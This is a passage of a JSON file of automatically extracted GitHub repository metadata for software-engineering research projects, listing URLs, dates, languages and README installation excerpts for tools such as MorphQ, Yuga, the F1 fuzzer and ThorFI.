                    "value": "https://github.com/qishenghu/InstructCoder",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We also plan to release our LoRA checkpoints [here](https://huggingface.co/happylkx). \n",
                    "original_header": "Release"
                },
                "confidence": 0.9230301884379253,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/qishenghu/CodeInstruct/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-05-21T16:27:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-29T06:27:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 46520
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "560": {
        "filename": "mazloomzadeh_Reputation-Gaming_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mazloomzadeh/Reputation-Gaming",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-06-28T08:27:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-11-16T13:04:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "561": {
        "filename": "RosaliaTufano_code_review_automation_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/RosaliaTufano/code_review_automation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "[Here](https://zenodo.org/record/5387856#.YTDrPZ4zZyo) we stored the extra materials you need in order to replicate our experiments: \n",
                    "original_header": "Resources"
                },
                "confidence": 0.9285701651614469,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/RosaliaTufano/code_review_automation/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We also provided a notebook (`Preprocessing.ipynb`) with all the preprocessing steps we followed to prepare our pre-training dataset and to train on it the Sentencepiece tokenizer.\n \n",
                    "original_header": "Train your own T5 models"
                },
                "confidence": 0.9400662176681974,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/RosaliaTufano/code_review_automation/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-01-14T09:53:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-10T08:56:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 177440
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 130676
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "562": {
        "filename": "sola-st_MorphQ-Quantum-Qiskit-Testing-ICSE-23_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sola-st/MorphQ-Quantum-Qiskit-Testing-ICSE-23",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "## Setup Environment\n\nWe provide the `environment.yml` file in the main folder to recreate the exact Conda environment with the same pip and Conda packages.\n\n\n1. Clone this repository: `git clone https://github.com/sola-st/MorphQ-Quantum-Qiskit-Testing-ICSE-23.git`\n2. make sure you have conda on your system (Download Conda for your system [here](https://docs.conda.io/projects/conda/en/latest/user-guide/install/download.html)) and that your system meets all the requirements (see [REQUIREMENTS.md](REQUIREMENTS.md))\n3. Run the following command:\n    ```bash\n    conda env create -f environment.yml\n    ```\n4. Then activate the environment with:\n    ```bash\n    conda activate MorphQ\n    ```\n5. Congratulations! You are ready to run MorphQ.\n\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/sola-st/MorphQ-Quantum-Qiskit-Testing-ICSE-23/main/INSTALL.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "MorphQ is a software to automatically test the Qiskit quantum computing platform using metamorphic testing.\nThe MorphQ software is open source and you find all the relevant source files in the [lib](lib) folder. \n",
                    "original_header": "MorphQ Software"
                },
                "confidence": 0.9028927302421618,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sola-st/MorphQ-Quantum-Qiskit-Testing-ICSE-23/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "3. to open jupyter notebook, run the following in your terminal:\n    ```bash\n    conda activate MorphQ\n    jupyter notebook\n    ``` \n4. In the jupyter notebook web interface, navigate to and execute top-to-bottom the following notebook: [notebooks/RQs_Reproduce_Analysis_Results.ipynb](notebooks/RQs_Reproduce_Analysis_Results.ipynb). \n",
                    "original_header": "Reproduce the Paper Figures (Level 1)"
                },
                "confidence": 0.9953340678578271,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sola-st/MorphQ-Quantum-Qiskit-Testing-ICSE-23/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Some questions you might ask yourself are:\n1. Did you install and activate the conda environment? via `conda activate MorphQ` \n",
                    "original_header": "Troubleshooting"
                },
                "confidence": 0.999999997521158,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sola-st/MorphQ-Quantum-Qiskit-Testing-ICSE-23/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-01-17T09:09:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-13T13:00:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 39574144
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 812549
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "OpenQASM",
                    "name": "OpenQASM",
                    "type": "Programming_language",
                    "size": 174893
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 3566
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1813
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1110
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "563": {
        "filename": "yuzhimanhua_HiGitClass_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/yuzhimanhua/HiGitClass",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "For training, a GPU is strongly recommended.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "HiGitClass: Keyword-Driven Hierarchical Classification of GitHub Repositories"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/yuzhimanhua/HiGitClass/master/README.md"
            },
            {
                "result": {
                    "value": "The code is based on Keras. You can find installation instructions [**here**](https://keras.io/#installation).\n",
                    "type": "Text_excerpt",
                    "original_header": "Keras",
                    "parent_header": [
                        "HiGitClass: Keyword-Driven Hierarchical Classification of GitHub Repositories",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/yuzhimanhua/HiGitClass/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**NOTE: If you would like to run our code on your own dataset, when you prepare this json file, make sure you list the labels in the top-down order. For example, if the label path of your repository is ROOT-A-B-C, then the \"labels\" field should be \\[\"A\", \"B\", \"C\"\\].** \n",
                    "original_header": "Data"
                },
                "confidence": 0.9963110080736239,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/yuzhimanhua/HiGitClass/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-08-12T18:31:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-11T08:11:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 57516
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 34418
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 4124
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1054
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 992
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "564": {
        "filename": "vnrst_Yuga_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/vnrst/Yuga",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To setup the code, clone the repository, `cd` into it, and run the following command (tested on Mac and Ubuntu):\n```\n./install-debug.sh\n```\nIf you face errors, please refer to the instructions in the main Rudra repository for installing Rudra in debug mode. \nOur tool can now be run using the `cargo-yuga` subcommand. For any Rust package that we want to analyze, run the following command from within the package folder:\n```\ncargo yuga\n```\nThis will print the reported vulnerabilities, if any, to `stdout`. \n|       Project       |                           Issue/PR                            | Public/Private API |          Status              |\n|---------------------|---------------------------------------------------------------|--------------------|------------------------------|\n| alsa                | https://github.com/diwic/alsa-rs/issues/117                   |       Public       |   Unconfirmed                |           \n| bv                  | https://github.com/tov/bv-rs/issues/16                        |       Public       |   Confirmed with Miri        |\n| pulse-binding-rust  | https://github.com/jnqnfe/pulse-binding-rust/issues/53        |       Public       |   Confirmed with Valgrind    |\n| cslice              | https://github.com/dherman/cslice/issues/5                    |       Public       |   Confirmed with Miri        |\n| json-rust / jzon-rs | https://github.com/maciejhirsz/json-rust/pull/209             |       Private      |   Confirmed by dev           |\n| sled                | https://github.com/spacejam/sled/issues/1442                  |       Private      |   Confirmed by dev           |\n| tokio               | https://github.com/tokio-rs/tokio/issues/5113                 |       Private      |   Unconfirmed                |\n \n",
                    "original_header": "Yuga: Automatically Detecting Lifetime Annotation Bugs in the Rust Language"
                },
                "confidence": 0.9999981104853104,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/vnrst/Yuga/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-11-11T07:00:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-25T15:52:40Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Rust",
                    "name": "Rust",
                    "type": "Programming_language",
                    "size": 171323
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 5203
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 3333
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PHP",
                    "name": "PHP",
                    "type": "Programming_language",
                    "size": 1221
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 936
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 737
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "565": {
        "filename": "atrisovic_dataverse-r-study_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/atrisovic/dataverse-r-study",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-05-25T21:15:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-17T20:32:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 7021317
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 43772
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 2819
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1121
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1075
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "566": {
        "filename": "cedricrupb_nbfbaselines_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/cedricrupb/nbfbaselines",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You can try these models easily yourself:\n```python\nfrom nbfbaselines import NBFModel\n\nnbf_model = NBFModel.from_pretrained([model_id])\n\n```\n \n",
                    "original_header": "Models"
                },
                "confidence": 0.964466456244689,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/cedricrupb/nbfbaselines/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-06-28T12:21:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-24T23:07:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 92159
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 11742
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "567": {
        "filename": "sarahaguasvivas_nlsoft_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sarahaguasvivas/nlsoft",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Step 1: Learn the forward dynamics\n- Step 2: Train the feedforward MLP\n- Step 3: Configure Controller\n- Step 4: Run!  \n\n<img src=\"https://github.com/sarahaguasvivas/nlsoft/blob/master/docs/neural_network_architecture.gif\" alt=\"drawing\" width=\"500\" align=\"center\"/> \n",
                    "original_header": "by Sarah Aguasvivas Manzano"
                },
                "confidence": 0.9994524985939328,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sarahaguasvivas/nlsoft/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-01-16T19:29:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-11-30T03:24:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 3560303
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 666765
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 211213
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 170571
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 143272
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 54562
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SWIG",
                    "name": "SWIG",
                    "type": "Programming_language",
                    "size": 2712
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 885
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 229
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "568": {
        "filename": "microsoft_JigsawDataset_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/microsoft/JigsawDataset",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-09-01T07:02:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-21T08:29:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "569": {
        "filename": "soarsmu_AndroEvolve_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/soarsmu/AndroEvolve",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-11-19T05:22:40Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-11-25T03:27:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 478600
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SmPL",
                    "name": "SmPL",
                    "type": "Programming_language",
                    "size": 19906
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "570": {
        "filename": "tatsuhirotsuchiya_SA4LA_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/tatsuhirotsuchiya/SA4LA",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-03-14T02:54:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-13T09:01:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 55603
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "571": {
        "filename": "fmidue_IOTasks_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/fmidue/IOTasks",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-03-17T07:16:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-27T09:15:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Haskell",
                    "name": "Haskell",
                    "type": "Programming_language",
                    "size": 178256
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "572": {
        "filename": "vrthra_f1_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/vrthra/F1",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you use F1 in a production setting, if you found bugs with it (yay!), or if\nyou have any suggestions to share, please let us know \u2013 your experience is very\nvaluable for us.  Thanks! \n",
                    "original_header": "F1 Fuzzer"
                },
                "confidence": 0.9720903174318392,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/vrthra/f1/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-11-17T16:15:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-21T04:24:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 15721829
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 42423
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 126
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "573": {
        "filename": "bin123apple_Fortran-CPP-HPC-code-translation-dataset_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/bin123apple/OpenMP-Fortran-CPP-Translation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You can also download the dataset from : [My Huggingface](https://huggingface.co/datasets/Bin12345/HPC_Fortran_CPP) \n",
                    "original_header": "Fortran-CPP-HPC-code-translation-dataset"
                },
                "confidence": 0.9446157328528614,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bin123apple/Fortran-CPP-HPC-code-translation-dataset/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Overview of steps are explained below.  \n[cc-by]: http://creativecommons.org/licenses/by/4.0/\n[cc-by-image]: https://i.creativecommons.org/l/by/4.0/88x31.png\n[cc-by-shield]: https://img.shields.io/badge/License-CC%20BY%204.0-lightgrey.svg\n \n",
                    "original_header": "Reproduce our result"
                },
                "confidence": 0.9914285433050973,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bin123apple/Fortran-CPP-HPC-code-translation-dataset/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-07-13T02:09:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-06T02:32:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 974
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "574": {
        "filename": "WulffHunter_log_generator_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/WulffHunter/log_generator",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "For the Apache Fake Log Generator tool, please see the `./generator/` folder. A complete description of how to use the tool in the `./generator/README.md` file.\n \n",
                    "original_header": "Apache Fake Log Generator"
                },
                "confidence": 0.9876709260048625,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/WulffHunter/log_generator/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-02-10T23:14:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-12-08T01:23:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 57644
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "575": {
        "filename": "microsoft_CodeBERT_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/microsoft/CodeBERT",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-06-17T07:37:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T12:02:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1123562
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 17821
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "576": {
        "filename": "dessertlab_thorfi_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dessertlab/thorfi",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To run ThorFI, you need a working OpenStack deployment. To try the tool, we suggest installing OpenStack on a virtual machine, by adopting an all-in-one deployment (all OpenStack services are deployed within the same VM). You can refer to the following tutorial about installing an OpenStack all-in-one deployment on CentOS: https://github.com/dessertlab/OpenStack-Fault-Injection-Environment/blob/7b1dea8afb342d2087cd3e1da555ef0e66b94258/INSTALL.md. On Ubuntu, you can use \nDevStack (https://docs.openstack.org/devstack/latest/).\n\nDepending on your OpenStack deployment, you need to install the following pre-requisites on the Controller, Compute, and Network nodes (see also https://docs.openstack.org/neutron/latest/admin/deploy.html).\n\n- On Ubuntu 18.04:\n\n```\n# apt-get install python-pip\n# pip2 install -r /path/to/ThorFI/requirements.txt\n# pip2 install decorator==4.4.1 pyrsistent==0.14.0 python-keystoneclient python-novaclient python-neutronclient python-glanceclient python-heatclient\n```\n\n- On CentOS 7:\n\n```\n# yum -y install epel-release\n# yum -y install python-pip\n# pip2 install -r /path/to/ThorFI/requirements.txt\n# pip2 install decorator==4.4.1 pyrsistent==0.14.0 python-keystoneclient python-novaclient python-neutronclient python-glanceclient python-heatclient\n```\n\nThorFI can be installed by copying the folder on the nodes and executed as Python scripts. It can also be installed as bundled Python package. We provide a Makefile to generate executables for the ThorFI front-end and the ThorFI injector (``thorfi_agent_app`` and ``injector_agent``).\n\n```\n# pip2 install pyinstaller==3.4\n# cd ~/path/to/ThorFI\n# make \n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing ThorFI"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/dessertlab/thorfi/main/README.md"
            },
            {
                "result": {
